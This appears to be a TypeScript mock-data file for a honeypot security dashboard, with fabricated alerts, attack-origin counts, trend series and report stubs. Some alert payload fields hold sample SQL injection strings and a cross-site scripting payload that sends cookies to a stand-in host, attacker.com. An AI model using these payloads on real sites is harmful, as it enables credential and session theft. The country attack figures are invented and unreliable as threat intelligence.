import { Alert, AttackOrigin, AttackTrend, PayloadType, SystemMetric, Report } from '../types';

// Generate a random ID
const generateId = () => Math.random().toString(36).substring(2, 10);

// Generate a random timestamp within the last 24 hours
const generateRecentTimestamp = () => {
  const now = new Date();
  const hoursAgo = Math.floor(Math.random() * 24);
  const minutesAgo = Math.floor(Math.random() * 60);
  now.setHours(now.getHours() - hoursAgo);
  now.setMinutes(now.getMinutes() - minutesAgo);
  return now.toISOString();
};

// Generate random alerts
export const alerts: Alert[] = [
  {
    id: generateId(),
    type: 'Honeypot Triggered',
    severity: 'high',
    ip: '203.0.113.45',
    location: 'Beijing, China',
    country: 'CN',
    payload: "SELECT * FROM users WHERE '1'='1';",
    timestamp: generateRecentTimestamp(),
    status: 'new',
    enrichment: {
      abuseScore: 87,
      previousIncidents: 12,
      knownMalicious: true,
    },
  },
  {
    id: generateId(),
    type: 'SQL Injection',
    severity: 'critical',
    ip: '198.51.100.123',
    location: 'Moscow, Russia',
    country: 'RU',
    payload: "UNION SELECT username, password FROM users--",
    timestamp: generateRecentTimestamp(),
    status: 'investigating',
    enrichment: {
      abuseScore: 95,
      previousIncidents: 28,
      knownMalicious: true,
    },
  },
  {
    id: generateId(),
    type: 'Brute Force',
    severity: 'medium',
    ip: '77.83.141.56',
    location: 'Bucharest, Romania',
    country: 'RO',
    timestamp: generateRecentTimestamp(),
    status: 'new',
    enrichment: {
      abuseScore: 68,
      previousIncidents: 4,
      knownMalicious: false,
    },
  },
  {
    id: generateId(),
    type: 'XSS Attempt',
    severity: 'medium',
    ip: '91.207.175.104',
    location: 'Kiev, Ukraine',
    country: 'UA',
    payload: "<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>",
    timestamp: generateRecentTimestamp(),
    status: 'resolved',
    enrichment: {
      abuseScore: 72,
      previousIncidents: 7,
      knownMalicious: true,
    },
  },
  {
    id: generateId(),
    type: 'Anomaly Detected',
    severity: 'low',
    ip: '159.89.112.45',
    location: 'Mumbai, India',
    country: 'IN',
    timestamp: generateRecentTimestamp(),
    status: 'false-positive',
  },
  {
    id: generateId(),
    type: 'Honeypot Triggered',
    severity: 'high',
    ip: '45.154.12.78',
    location: 'Lagos, Nigeria',
    country: 'NG',
    payload: "admin' --",
    timestamp: generateRecentTimestamp(),
    status: 'new',
    enrichment: {
      abuseScore: 83,
      previousIncidents: 9,
      knownMalicious: true,
    },
  },
  {
    id: generateId(),
    type: 'Brute Force',
    severity: 'high',
    ip: '141.98.10.54',
    location: 'Seoul, South Korea',
    country: 'KR',
    timestamp: generateRecentTimestamp(),
    status: 'investigating',
  },
];

// Attack origins for the map
export const attackOrigins: AttackOrigin[] = [
  { country: 'CN', count: 1254, coordinates: [104.1954, 35.8617] },
  { country: 'RU', count: 897, coordinates: [105.3188, 61.5240] },
  { country: 'US', count: 645, coordinates: [-95.7129, 37.0902] },
  { country: 'IN', count: 543, coordinates: [78.9629, 20.5937] },
  { country: 'BR', count: 421, coordinates: [-51.9253, -14.2350] },
  { country: 'NG', count: 387, coordinates: [8.6753, 9.0820] },
  { country: 'KR', count: 356, coordinates: [127.9785, 37.6639] },
  { country: 'UA', count: 289, coordinates: [31.1656, 48.3794] },
  { country: 'RO', count: 245, coordinates: [24.9668, 45.9432] },
  { country: 'VN', count: 178, coordinates: [108.2772, 14.0583] },
];

// Attack trends for the last 7 days
export const attackTrends: AttackTrend[] = Array.from({ length: 7 }, (_, i) => {
  const date = new Date();
  date.setDate(date.getDate() - (6 - i));
  
  return {
    date: date.toISOString().split('T')[0],
    honeypotHits: 50 + Math.floor(Math.random() * 150),
    blockedAttacks: 200 + Math.floor(Math.random() * 300),
    anomalies: 10 + Math.floor(Math.random() * 40),
  };
});

// Payload types distribution
export const payloadTypes: PayloadType[] = [
  { type: 'SQL Injection', count: 1456, percentage: 34.5 },
  { type: 'XSS', count: 987, percentage: 23.4 },
  { type: 'Command Injection', count: 654, percentage: 15.5 },
  { type: 'File Inclusion', count: 432, percentage: 10.2 },
  { type: 'Path Traversal', count: 321, percentage: 7.6 },
  { type: 'SSRF', count: 245, percentage: 5.8 },
  { type: 'Others', count: 124, percentage: 3.0 },
];

// System metrics for the last 24 hours
export const systemMetrics: SystemMetric[] = Array.from({ length: 24 }, (_, i) => {
  const time = new Date();
  time.setHours(time.getHours() - (23 - i));
  
  return {
    timestamp: time.toISOString(),
    cpu: 20 + Math.floor(Math.random() * 30),
    memory: 30 + Math.floor(Math.random() * 40),
    requests: 100 + Math.floor(Math.random() * 200),
    errorRate: Math.random() * 1.5,
  };
});

// Recent reports
export const reports: Report[] = [
  {
    id: generateId(),
    title: 'Weekly Security Summary',
    date: '2025-04-22',
    summary: 'Overview of security incidents from the past week with threat analysis and recommendations.',
    downloadUrl: '#',
  },
  {
    id: generateId(),
    title: 'Monthly Threat Intelligence',
    date: '2025-04-01',
    summary: 'Comprehensive analysis of attack patterns, emerging threats, and security posture recommendations.',
    downloadUrl: '#',
  },
  {
    id: generateId(),
    title: 'SQL Injection Campaign Analysis',
    date: '2025-03-28',
    summary: 'Detailed review of recent SQL injection attempts with attack vector analysis.',
    downloadUrl: '#',
  },
  {
    id: generateId(),
    title: 'Critical Vulnerability Alert',
    date: '2025-03-15',
    summary: 'Analysis of potential impact from newly discovered vulnerabilities affecting our systems.',
    downloadUrl: '#',
  },
];